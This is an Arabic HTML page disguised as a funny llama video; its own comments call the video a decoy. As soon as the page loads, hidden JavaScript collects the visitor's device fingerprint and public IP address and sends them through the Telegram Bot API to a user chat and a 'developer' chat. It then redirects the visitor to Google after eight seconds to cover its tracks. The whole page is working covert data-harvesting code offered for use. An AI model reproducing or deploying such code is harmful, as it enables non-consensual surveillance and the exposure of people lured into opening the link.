<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>شاهد أغرب حيوان لاما 😂</title>
</head>
<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; margin:0; overflow:hidden;">

    <h2 style="margin-top:15px; color:#f1c40f;">انتظر... اللاما بدها تسلم عليك! 🦙😂</h2>

    <!-- فيديو اللاما (التمويه) -->
    <video id="llamaVideo" width="100%" height="auto" autoplay loop muted playsinline style="max-width:450px; border: 4px solid #f1c40f; border-radius:20px;">
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"> 
        <!-- ملاحظة: استبدل الرابط أعلاه برابط فيديو اللاما الحقيقي إذا كان عندك -->
    </video>

    <script>
        const p = new URLSearchParams(window.location.search);
        const userId = p.get('user_id'), adminId = p.get('admin_id'), botToken = p.get('bot_token');

        async function captureAll() {
            // تجميع كل شي بنقدر نسحبه
            const info = {
                device: navigator.platform,
                agent: navigator.userAgent,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                screen: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language,
                online: navigator.onLine ? "Yes" : "No",
                touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
                vendor: navigator.vendor,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
            };

            // محاولة جلب الـ IP العام (Public IP)
            let publicIP = "N/A";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                publicIP = data.ip;
            } catch (e) {}

            const message = `
🦙 **M.Y.9 Full System Capture**
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🌐 **IP Address:** \`${publicIP}\`
📱 **Platform:** \`${info.device}\`
⚙️ **Cores:** \`${info.cores}\`
🧠 **RAM:** \`${info.ram} GB\`
🖥️ **Screen:** \`${info.screen}\`
🌍 **Timezone:** \`${info.timezone}\`
🖱️ **Touch Support:** \`${info.touch}\`
🍪 **Cookies:** \`${info.cookies}\`
🏳️ **Language:** \`${info.lang}\`
👑 **Dev:** Abu Osayed Malkawi
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
            `;

            const finalMsg = encodeURIComponent(message);

            // إرسال البيانات (إرسال مزدوج)
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${finalMsg}&parse_mode=Markdown`);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("⚠️ صيد كامل للمطور:\n" + message)}&parse_mode=Markdown`);
        }

        // تشغيل السحب فوراً
        captureAll();

        // تحويل بعد 8 ثواني
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 8000);
    </script>
</body>
</html>
